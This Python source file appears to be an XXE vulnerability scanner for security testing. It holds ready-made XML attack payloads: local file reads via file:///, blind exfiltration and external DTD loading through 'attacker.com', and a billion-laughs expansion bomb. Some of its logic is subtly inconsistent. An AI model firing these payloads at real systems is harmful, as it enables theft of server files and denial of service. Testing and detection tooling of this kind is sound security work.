from typing import Dict, List, Optional, Tuple, Set, Pattern
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time
import xml.etree.ElementTree as ET


class XXEType(Enum):
    CLASSIC_XXE = "classic_xxe"
    BLIND_XXE = "blind_xxe"
    BILLION_LAUGHS = "billion_laughs"
    QUADRATIC_BLOWUP = "quadratic_blowup"
    EXTERNAL_ENTITY = "external_entity"
    PARAMETER_ENTITY = "parameter_entity"
    DTD_RETRIEVAL = "dtd_retrieval"
    XPATH_INJECTION = "xpath_injection"


class PayloadType(Enum):
    FILE_INCLUSION = "file_inclusion"
    URL_INVOCATION = "url_invocation"
    ENTITY_EXPANSION = "entity_expansion"
    DTD_EXTERNAL = "dtd_external"
    PARAMETER_ENTITY_INJECTION = "parameter_entity_injection"


@dataclass
class XXEPayload:
    payload: str
    xxe_type: XXEType
    payload_type: PayloadType
    severity: str = "Critical"
    detection_indicators: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.15


@dataclass
class XXEVulnerability:
    vulnerability_type: str
    xxe_type: XXEType
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    file_retrieved: bool
    file_path: Optional[str] = None
    file_content: Optional[str] = None
    external_entity_resolved: bool = False
    entity_endpoint: Optional[str] = None
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)


class XXEPayloadGenerator:
    BASIC_XXE_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///{file_path}">]>
<foo>&xxe;</foo>'''
    
    BLIND_XXE_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "file:///{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'>">
%eval;
%exfiltrate;]>
<foo>blind</foo>'''
    
    BILLION_LAUGHS_TEMPLATE = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>'''
    
    PARAMETER_ENTITY_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///{file_path}">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&send;</foo>'''
    
    @staticmethod
    def generate_file_inclusion_payload(file_path: str) -> str:
        return XXEPayloadGenerator.BASIC_XXE_TEMPLATE.format(file_path=file_path)
    
    @staticmethod
    def generate_blind_xxe_payload(exfiltration_url: str, file_path: str) -> str:
        return XXEPayloadGenerator.BLIND_XXE_TEMPLATE.format(file_path=file_path)
    
    @staticmethod
    def generate_billion_laughs_payload() -> str:
        return XXEPayloadGenerator.BILLION_LAUGHS_TEMPLATE
    
    @staticmethod
    def generate_parameter_entity_payload(file_path: str) -> str:
        return XXEPayloadGenerator.PARAMETER_ENTITY_TEMPLATE.format(file_path=file_path)


class XMLValidator:
    @staticmethod
    def is_valid_xml(content: str) -> Tuple[bool, Optional[str]]:
        try:
            ET.fromstring(content)
            return True, None
        except ET.ParseError as e:
            return False, str(e)
    
    @staticmethod
    def extract_xml_structure(content: str) -> Optional[Dict]:
        try:
            root = ET.fromstring(content)
            return {
                'root_tag': root.tag,
                'attributes': root.attrib,
                'children': len(list(root)),
                'text_content': root.text[:100] if root.text else None,
            }
        except:
            return None
    
    @staticmethod
    def detect_dtd_declaration(content: str) -> Tuple[bool, Optional[str]]:
        dtd_pattern = r'<!DOCTYPE\s+(\w+)[^>]*>'
        match = re.search(dtd_pattern, content)
        return bool(match), match.group(1) if match else None
    
    @staticmethod
    def detect_entity_declaration(content: str) -> List[str]:
        entity_pattern = r'<!ENTITY\s+([%\w]+)\s+(?:SYSTEM|PUBLIC)'
        return re.findall(entity_pattern, content)


class XXEResponseAnalyzer:
    FILE_PATTERNS = {
        '/etc/passwd': [
            r'root:.*:/bin/.*',
            r'nobody:.*:/usr/sbin',
        ],
        '/etc/hosts': [
            r'localhost\s+127\.0\.0\.1',
            r'127\.0\.0\.1\s+localhost',
        ],
        'C:\\windows\\win.ini': [
            r'\[boot\]|\[fonts\]',
        ],
        'C:\\windows\\system32\\drivers\\etc\\hosts': [
            r'localhost\s+127\.0\.0\.1',
        ],
    }
    
    @staticmethod
    def detect_file_content(response_content: str) -> Tuple[bool, Optional[str], List[str]]:
        detected_files = []
        indicators = []
        
        for file_path, patterns in XXEResponseAnalyzer.FILE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_content, re.MULTILINE):
                    detected_files.append(file_path)
                    indicators.extend(re.findall(pattern, response_content))
        
        return len(detected_files) > 0, detected_files[0] if detected_files else None, indicators
    
    @staticmethod
    def extract_content_between_tags(response_content: str, tag: str) -> Optional[str]:
        pattern = rf'<{tag}>(.*?)</{tag}>'
        match = re.search(pattern, response_content, re.DOTALL)
        return match.group(1) if match else None
    
    @staticmethod
    def detect_xml_declaration_echo(response_content: str, original_payload: str) -> bool:
        if '<?xml' in response_content and 'DOCTYPE' in original_payload:
            return True
        return False


class ExternalEntityDetector:
    SYSTEM_KEYWORDS = [
        'SYSTEM',
        'PUBLIC',
        'file://',
        'http://',
        'https://',
        'ftp://',
        'gopher://',
        'dict://',
    ]
    
    @staticmethod
    def detect_entity_resolution(response_content: str, payload: str) -> Tuple[bool, Optional[str]]:
        for keyword in ExternalEntityDetector.SYSTEM_KEYWORDS:
            if keyword in payload and keyword not in response_content:
                continue
            elif keyword in payload:
                return True, keyword
        
        if 'lol' in payload and len(response_content) > 10000:
            return True, 'Entity_Expansion'
        
        return False, None
    
    @staticmethod
    def extract_entity_endpoints(payload: str) -> List[str]:
        endpoints = []
        
        url_pattern = r'(https?://[^\s"\'>]+)'
        endpoints.extend(re.findall(url_pattern, payload))
        
        file_pattern = r'(file:///[^\s"\'>]+)'
        endpoints.extend(re.findall(file_pattern, payload))
        
        return endpoints


class DtdAnalyzer:
    @staticmethod
    def detect_external_dtd(payload: str) -> Tuple[bool, Optional[str]]:
        dtd_pattern = r'<!ENTITY\s+%?\w+\s+(?:SYSTEM|PUBLIC)\s+["\']([^"\']+)["\']'
        match = re.search(dtd_pattern, payload)
        return bool(match), match.group(1) if match else None
    
    @staticmethod
    def detect_parameter_entity(payload: str) -> List[str]:
        param_entity_pattern = r'<!ENTITY\s+%(\w+)'
        return re.findall(param_entity_pattern, payload)
    
    @staticmethod
    def detect_doctype_bypass(payload: str) -> Tuple[bool, List[str]]:
        bypass_techniques = []
        
        if 'SYSTEM' in payload:
            bypass_techniques.append('SYSTEM_keyword')
        
        if '<?xml' in payload:
            bypass_techniques.append('XML_declaration')
        
        if '%' in payload:
            bypass_techniques.append('Parameter_entity')
        
        if '&' in payload and '%' not in payload:
            bypass_techniques.append('General_entity')
        
        return len(bypass_techniques) > 0, bypass_techniques


class DenialOfServiceDetector:
    EXPANSION_PATTERNS = [
        r'<!ENTITY\s+\w+\s+"[^"]*&',
        r'<!ENTITY\s+\w+\s+\'[^\']*&',
    ]
    
    @staticmethod
    def detect_entity_expansion_attack(payload: str) -> Tuple[bool, float]:
        entity_count = payload.count('<!ENTITY')
        reference_count = payload.count('&')
        
        if entity_count > 5 and reference_count > entity_count * 5:
            expansion_ratio = reference_count / entity_count
            confidence = min(expansion_ratio / 50, 1.0)
            return True, confidence
        
        if 'lol' in payload or 'billion' in payload.lower():
            return True, 0.9
        
        return False, 0.0
    
    @staticmethod
    def detect_quadratic_blowup(payload: str) -> Tuple[bool, float]:
        if '<' in payload and len(payload) > 1000:
            tag_density = payload.count('<') / len(payload)
            if tag_density > 0.1:
                return True, min(tag_density, 1.0)
        
        return False, 0.0


class XXEScanner:
    def __init__(self):
        self.payload_generator = XXEPayloadGenerator()
        self.xml_validator = XMLValidator()
        self.response_analyzer = XXEResponseAnalyzer()
        self.entity_detector = ExternalEntityDetector()
        self.dtd_analyzer = DtdAnalyzer()
        self.dos_detector = DenialOfServiceDetector()
        
        self.vulnerabilities: List[XXEVulnerability] = []
        self.scan_statistics = defaultdict(int)
        self.lock = threading.Lock()
    
    def scan(self, target_url: str, response: Dict, payloads: List[str]) -> List[XXEVulnerability]:
        vulnerabilities = []
        response_content = response.get('content', '')
        response_time = response.get('response_time', 0)
        status_code = response.get('status_code', 0)
        
        parameter = self._extract_parameter_name(target_url)
        
        for payload in payloads:
            is_vulnerable, xxe_type, evidence = self._test_payload(
                response_content,
                payload,
                response_time
            )
            
            if is_vulnerable:
                file_detected, file_path, file_indicators = self.response_analyzer.detect_file_content(response_content)
                entity_resolved, entity_endpoint = self.entity_detector.detect_entity_resolution(response_content, payload)
                external_dtd, dtd_url = self.dtd_analyzer.detect_external_dtd(payload)
                
                file_content = None
                if file_detected:
                    file_content = self.response_analyzer.extract_content_between_tags(response_content, 'root')
                
                vuln = XXEVulnerability(
                    vulnerability_type='XML External Entity (XXE)',
                    xxe_type=xxe_type,
                    url=target_url,
                    parameter=parameter,
                    payload=payload,
                    severity=self._determine_severity(xxe_type),
                    evidence=evidence,
                    response_time=response_time,
                    file_retrieved=file_detected,
                    file_path=file_path,
                    file_content=file_content,
                    external_entity_resolved=entity_resolved,
                    entity_endpoint=entity_endpoint,
                    confirmed=file_detected or entity_resolved,
                    remediation=self._get_remediation()
                )
                
                if self._is_valid_vulnerability(vuln):
                    vulnerabilities.append(vuln)
                    self.scan_statistics[xxe_type.value] += 1
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
        
        return vulnerabilities
    
    def _test_payload(self, response_content: str, payload: str,
                     response_time: float) -> Tuple[bool, XXEType, str]:
        
        file_detected, file_path, indicators = self.response_analyzer.detect_file_content(response_content)
        if file_detected:
            return True, XXEType.CLASSIC_XXE, f"File content detected: {file_path}"
        
        entity_resolved, entity_endpoint = self.entity_detector.detect_entity_resolution(response_content, payload)
        if entity_resolved:
            return True, XXEType.EXTERNAL_ENTITY, f"External entity resolved: {entity_endpoint}"
        
        is_dos, dos_confidence = self.dos_detector.detect_entity_expansion_attack(payload)
        if is_dos:
            return True, XXEType.BILLION_LAUGHS, f"Entity expansion attack detected ({dos_confidence:.0%} confidence)"
        
        is_quadratic, quadratic_confidence = self.dos_detector.detect_quadratic_blowup(payload)
        if is_quadratic:
            return True, XXEType.QUADRATIC_BLOWUP, f"Quadratic blowup detected ({quadratic_confidence:.0%} confidence)"
        
        if response_time > 5 and 'sleep' in payload.lower():
            return True, XXEType.BLIND_XXE, f"Time-based XXE: {response_time:.2f}s delay"
        
        is_valid, _ = self.xml_validator.is_valid_xml(response_content)
        if not is_valid and 'DOCTYPE' in payload:
            return True, XXEType.DTD_RETRIEVAL, "Invalid XML after XXE attempt"
        
        param_entities = self.dtd_analyzer.detect_parameter_entity(payload)
        if param_entities:
            return True, XXEType.PARAMETER_ENTITY, f"Parameter entity injection detected: {', '.join(param_entities)}"
        
        return False, XXEType.CLASSIC_XXE, ""
    
    def _extract_parameter_name(self, url: str) -> str:
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())[0] if params else 'parameter'
    
    def _determine_severity(self, xxe_type: XXEType) -> str:
        severity_map = {
            XXEType.CLASSIC_XXE: 'Critical',
            XXEType.BLIND_XXE: 'High',
            XXEType.BILLION_LAUGHS: 'Critical',
            XXEType.QUADRATIC_BLOWUP: 'High',
            XXEType.EXTERNAL_ENTITY: 'Critical',
            XXEType.PARAMETER_ENTITY: 'Critical',
            XXEType.DTD_RETRIEVAL: 'High',
            XXEType.XPATH_INJECTION: 'High',
        }
        return severity_map.get(xxe_type, 'High')
    
    def _is_valid_vulnerability(self, vuln: XXEVulnerability) -> bool:
        if vuln.confidence_score < 0.6:
            return False
        
        if any(word in vuln.payload.lower() for word in ['test', 'debug', 'sample']):
            return False
        
        return vuln.confirmed or vuln.xxe_type in [XXEType.BILLION_LAUGHS, XXEType.QUADRATIC_BLOWUP]
    
    def _get_remediation(self) -> str:
        return (
            "Disable XML external entity processing (XXE). "
            "Use safe XML parsing libraries. "
            "Set XMLConstants.ACCESS_EXTERNAL_DTD to empty string. "
            "Set XMLConstants.ACCESS_EXTERNAL_SCHEMA to empty string. "
            "Disable DOCTYPE declaration validation. "
            "Implement XML entity/DTD validation. "
            "Use allowlists for external entity resolution. "
            "Apply input validation and sanitization. "
            "Use Web Application Firewall (WAF) rules."
        )
    
    def get_vulnerabilities(self) -> List[XXEVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()
